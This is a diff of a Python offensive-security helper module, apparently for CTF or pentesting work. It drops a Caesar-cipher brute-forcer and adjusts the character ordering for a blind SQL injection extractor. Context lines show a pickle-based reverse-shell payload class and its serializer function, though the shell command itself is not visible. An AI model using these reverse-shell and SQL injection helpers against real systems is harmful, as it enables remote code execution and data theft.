@@ -5,18 +5,6 @@ import string
 import time
 import requests
 
-def caesar(s, alphabet_only=True):
-	if alphabet_only:
-		for i in range(26):
-			yield "".join(
-				chr((ord(c) + i - 65) % 26 +
-				65) if c.isupper() else chr((ord(c) + i - 97) % 26 + 97) if c.islower() else c
-				for c in s
-			)
-	else:  #full ascii
-		for i in range(128):
-			yield "".join(chr((ord(c) + i) % 128) for c in s if (ord(c) + i) % 128 > 31)
-
 class PickleRevShell:
 	def __init__(self, host, port):
 		self.host = host
@@ -30,8 +18,8 @@ def pickle_rev_shell(host, port):
 	return pickle.dumps(PickleRevShell(host, port))
 
 _chars = (string.ascii_letters + string.digits + string.punctuation +
-	string.whitespace).translate(str.maketrans("", "", "%_*?")) + "_?"
-# make sure that the GLOB and LIKE match 0+ chars don't match and the match 1 char only matches if nothing else can match
+	string.whitespace).translate(str.maketrans("", "", "%_*?")) + "_?*%"
+# make sure GLOB and LIKE special characters match last
 
 def blind_sqli(inject_template, sqli_oracle, chars=_chars):
 	"""sqli_oracle takes a sql condition and returns if its true or false
